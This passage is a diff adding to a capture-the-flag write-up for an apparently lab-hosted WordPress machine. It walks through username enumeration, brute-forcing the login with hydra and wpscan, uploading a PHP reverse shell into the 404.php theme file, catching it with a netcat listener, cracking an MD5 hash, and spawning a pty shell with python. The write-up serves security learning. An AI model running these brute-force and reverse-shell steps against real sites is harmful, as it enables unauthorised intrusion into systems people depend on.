@@ -81,3 +81,46 @@ I tried but this didn't work. So I scanned it with **wpscan** tool.
 ```bash
 wpscan --url IP --api-token API-KEY
 ```
+**wp-scan** result: [wpscan.txt](wpscan.txt)
+
+Found some vulnerabilities but noting special. 
+
+---
+## Exploitation
+I decided to brute force on the **login** page with **Burp Intruder**
+
+Found the user name **El###t**. On the login page the error will say: `The password you entered for the username El###t is incorrect.`
+
+Now let's brute force with **hydra**.<br>
+```bash
+hydra -l Elliot -P fsocity.dic 10.10.26.240 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.26.240%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+```
+
+Unfortunately *hydra* was being a bitch. So I had to use **WPSCAN**. But before that I removed duplicate words from the **fsocity.dic**.
+```bash
+cat fsocity.dic | sort | uniq > passwords.txt
+wpscan --url <ip>/wp-login.php -U elliot -P password.txt
+```
+
+Then I got the password for our user which is **ER28-0652**
+
+Now login to the admin panel and upload your [shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).Don't forget to change your **IP** and **PORT**.
+
+I uploaded mine into **404.php**.
+
+Now start **NETCAT** to listen on your port specified. I used the port **4499** in this case.
+
+`nc -lnvp 4499`
+
+visit the 404.php page and you will get a reverse shell.
+
+Moving to home directory, I found a user directoy `/robot` with our second key and a password in MD5 formate.
+
+I used **[crack station](https://crackstation.net)** to decrypt the pass.
+
+But there was a problem that was stopping me from executing `su` command and giving me an error like `su: must be run from a terminal`. 
+
+After searching for a while I found a *StackOverFlow* post where they suggest some solutions. I used python to span another shell
+```bash
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
